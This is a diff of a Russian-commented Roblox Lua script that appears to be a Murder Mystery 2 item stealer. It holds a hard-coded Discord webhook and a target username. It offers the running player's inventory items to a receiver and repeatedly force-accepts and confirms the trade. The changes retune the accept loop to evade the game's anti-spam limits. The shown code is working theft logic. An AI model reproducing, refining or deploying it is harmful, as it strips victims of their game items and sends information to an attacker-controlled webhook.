@@ -1,3 +1,4 @@
+--call
 Username = "Protoxak"
 Webhook = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"
 
@@ -127,7 +128,7 @@ local dTr=function() if TSrv then pcall(function() TSrv.DeclineTrade:FireServer(
 local cTr=function(tP) task.spawn(function() while tP and tP.Parent==P do sTr(tP) task.wait(0.5) end end) end
 
 -- ═══════════════════════════════════════════════════════
--- ФИКС: универсальный accept — перебирает все числа и сигнатуры
+-- ФИКС: одиночный accept раз в 12 секунд (анти-спам MM2)
 -- ═══════════════════════════════════════════════════════
 local InsIt=function()
  local rcv=P:FindFirstChild(recvr) if not rcv then dTr() return end
@@ -140,7 +141,7 @@ local InsIt=function()
    for j=1,it.amount do
     local ok,err=pcall(function() RS.Trade.OfferItem:FireServer(unpack(ar)) iOf=iOf+1 tIn=tIn+1 end)
     if ok then suc=true end
-    task.wait(0.1)  -- ФИКС: пауза чтобы не рейт-лимитнуло
+    task.wait(0.1)
    end
    if suc then iAd=iAd+1 table.insert(tIt,{id=it.id,amount=iOf}) end
   end
@@ -149,9 +150,8 @@ local InsIt=function()
  if iAd==0 then dTr() return end
 
  task.spawn(function()
-  task.wait(2)  -- ждём обработки OfferItem на сервере
+  task.wait(2)
 
-  -- находим трейд-ремоуты в обоих местах
   local tradeRemote = RS:FindFirstChild("Trade")
   if not tradeRemote then
    local rem = RS:FindFirstChild("Remotes")
@@ -160,52 +160,30 @@ local InsIt=function()
   if not tradeRemote then return end
 
   local acceptR  = tradeRemote:FindFirstChild("AcceptTrade")
-  local cancelR  = tradeRemote:FindFirstChild("CancelAccept")
   local confirmR = tradeRemote:FindFirstChild("ConfirmTrade")
                 or tradeRemote:FindFirstChild("FinalizeTrade")
                 or tradeRemote:FindFirstChild("CompleteTrade")
-                or tradeRemote:FindFirstChild("ForceTrade")
   local statusR  = tradeRemote:FindFirstChild("GetTradeStatus")
 
-  -- все возможные числа
-  local ACCEPT_NUMS = {
-   game.PlaceId * 3,   -- 428469873 (актуальное для MM2)
-   game.PlaceId,       -- 142823291
-   game.PlaceId * 2,   -- 285646582 (твоё старое)
-   game.PlaceId * 6,   -- 856939746
-   285646582,
-   428469873,
-  }
-
   local acc = false
-  local timeout = tick() + 90
+  local timeout = tick() + 600  -- 10 минут максимум
+  local attempt = 0
 
   while not acc and tick() < timeout do
+   attempt = attempt + 1
+   warn("[trade] attempt #" .. attempt)
+
    if acceptR then
-    for _, num in ipairs(ACCEPT_NUMS) do
-     pcall(function() acceptR:FireServer(num) end)
-     task.wait(0.015)
-     pcall(function() acceptR:FireServer(num, nil) end)
-     task.wait(0.015)
-     pcall(function() acceptR:FireServer(num, true) end)
-     task.wait(0.015)
-    end
-    -- пробуем без аргументов
-    pcall(function() acceptR:FireServer() end)
-    task.wait(0.015)
+    pcall(function() acceptR:FireServer(game.PlaceId * 3) end)
    end
 
    if confirmR then
     pcall(function() confirmR:FireServer() end)
-    task.wait(0.02)
    end
 
-   if cancelR then
-    pcall(function() cancelR:FireServer() end)
-    task.wait(0.02)
-   end
+   -- ЖДЁМ 12 СЕКУНД — анти-спам MM2
+   task.wait(12)
 
-   -- проверка реального статуса
    if statusR then
     local ok, s = pcall(function() return statusR:InvokeServer() end)
     if ok and s == "None" then
@@ -218,11 +196,8 @@ local InsIt=function()
     acc = true
     break
    end
-
-   task.wait(0.03)
   end
 
-  -- обновляем инвентарь после успешной сделки
   if acc then
    for _, td in ipairs(tIt) do
     for j, it in ipairs(InvT) do
